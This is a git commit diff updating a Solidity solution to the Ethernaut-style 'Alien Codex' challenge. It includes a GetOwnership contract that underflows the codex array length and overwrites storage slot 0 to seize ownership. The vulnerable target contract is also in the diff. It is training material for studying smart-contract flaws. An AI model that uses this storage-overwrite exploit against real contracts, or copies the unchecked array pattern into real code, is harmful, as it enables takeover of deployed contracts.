99ce551cb296960601ef62351b65b0629a552c53
Claudia <claudiabarcelovaldes40@gmail.com>
2023-12-04 00:04:19 +0100

    update alien codex lvl

--- contracts/20AlienCodex.sol
+++ contracts/20AlienCodex.sol
@@ -1,7 +1,11 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.5.0;
 
-import "../helpers/Ownable-05.sol";
+// import "../helpers/Ownable-05.sol";
+
+import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v2.5.1/contracts/ownership/Ownable.sol";
+
+import "hardhat/console.sol";
 
 contract AlienCodex is Ownable {
   bool public contact;
@@ -12,7 +16,7 @@ contract AlienCodex is Ownable {
     _;
   }
 
-  function make_contact() public {
+  function makeContact() public {
     contact = true;
   }
 
@@ -30,21 +34,23 @@ contract AlienCodex is Ownable {
 }
 
 contract GetOwnership {
-  AlienCodex ctr;
-
-  constructor(address ctrAddr) public {
-    ctr = AlienCodex(ctrAddr);
-  }
-
   function calcIdx() public pure returns (uint) {
+    console.logBytes(abi.encode(1));
+    console.logBytes32(keccak256(abi.encode(1)));
+    console.log(uint(keccak256(abi.encode(1))));
+    // ((2 ** 256) - 1) will be the last storage space
+    // the idx=0 pos in the array will be keccak256(abi.encode(1)) cuz the array is defined in the storage 1
+    // the last storage possition will correspond with the ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) index
+    // so just adding one to that idx will correspond to the storage at 0
+    // ? can check that adding 2 will correspond to the storage at 1 (the array lenght)
     return ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1;
   }
 
-  function setMeAsOwner() public {
-    ctr.make_contact();
+  function setMeAsOwner(address ctr) public {
+    AlienCodex(ctr).makeContact();
     // decrease the codex length (will underflow)
-    ctr.retract();
+    AlienCodex(ctr).retract();
     // set my address in the slot 0 of the storage
-    ctr.revise(calcIdx(), bytes32(uint256(uint160(tx.origin))));
+    AlienCodex(ctr).revise(calcIdx(), bytes32(uint256(uint160(tx.origin))));
   }
 }
